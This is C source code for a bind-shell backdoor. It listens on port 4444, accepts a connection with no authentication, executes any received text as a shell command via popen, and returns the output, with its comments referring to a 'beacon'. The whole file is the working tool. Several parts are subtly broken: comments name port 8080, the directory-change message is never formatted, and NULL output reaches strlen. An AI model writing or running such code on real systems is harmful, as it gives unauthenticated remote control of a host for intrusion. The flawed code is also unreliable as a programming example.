#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 4444
#define BUFFER_SIZE 8192
#define GREEN "\e[1;32m"
#define CYAN "\e[1;36m"
#define RED "\e[1;31m"
#define RESET "\033[0m"

int server_fd, new_socket;
ssize_t received;
struct sockaddr_in address;
int opt = 1;
socklen_t addrlen = sizeof(address);
char buffer[BUFFER_SIZE] = { 0 };
char *error;

void sizeErr(int bruh) {
    error = (RED "ERROR: Output is too small...\n" RESET);
    send(new_socket, error, strlen(error), 0);
}

void cdError(int bruhhh) {
    error = (RED "ERROR: Something went wrong! Unable to change directory...\n" RESET);
    send(new_socket, error, strlen(error), 0);
}

//Catch Ctrl+C
static volatile int keepRunning = 1;

void intHandler(int dummy) {
    keepRunning = 0;
}

char *execute(const char *command) {
    FILE *pipe = popen(command, "r");
    if (!pipe) return NULL;
    char buf[BUFFER_SIZE];

    char *result = NULL;
    size_t size = 0;
    
    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        size_t len = strlen(buf);
        char *temp = realloc(result, size + len + 1);
        if (!temp) {
            free(result);
            pclose(pipe);
            return NULL;
        }
        result = temp;
        strcpy(result + size, buf);
        size += len;
    }

    pclose(pipe);
    return result;
}



int main(int argc, char const* argv[]) {

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Failed to initialize socket");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("Failed to attach socket to port");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Failed to bind socket to port");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) < 0) {
        perror("Failed to listen");
        exit(EXIT_FAILURE);
    }

    if ((new_socket = accept(server_fd, (struct sockaddr*)&address, &addrlen)) < 0) {
        perror("Failed to accept connection");
        exit(EXIT_FAILURE);
    }

    //Listens for commands sent from client, executes them, and sends the output back
    while(keepRunning) {
        memset(buffer, 0, BUFFER_SIZE);
        received = read(new_socket, buffer, BUFFER_SIZE - 1);
        
        //Handles the cd command because without it, the server exits cuz popen.
        if (strncmp(buffer, "cd ", 3) == 0) {
            char *path = buffer + 3;
            buffer[received] = '\0';
            path[strcspn(path, "\r\n")] = 0;
            if (chdir(path) != 0) {
                cdError(0);
            } else {
                char *success = ("Directory changed to %s", path);
                send(new_socket, success, strlen(success), 0);
            }
            continue;
        }
        
        char *output = execute(buffer);
        printf("%s", output);

        if (received <= 0) {
            printf("Beacon died or something went wrong...");
            //break;
        }

        if (send(new_socket, output, strlen(output), 0) < 0) {
            printf("Unable to send output...");
            sizeErr(0);
        }
    }

    // closing the connected socket
    close(new_socket);
  
    // closing the listening socket
    close(server_fd);
    return 0;
}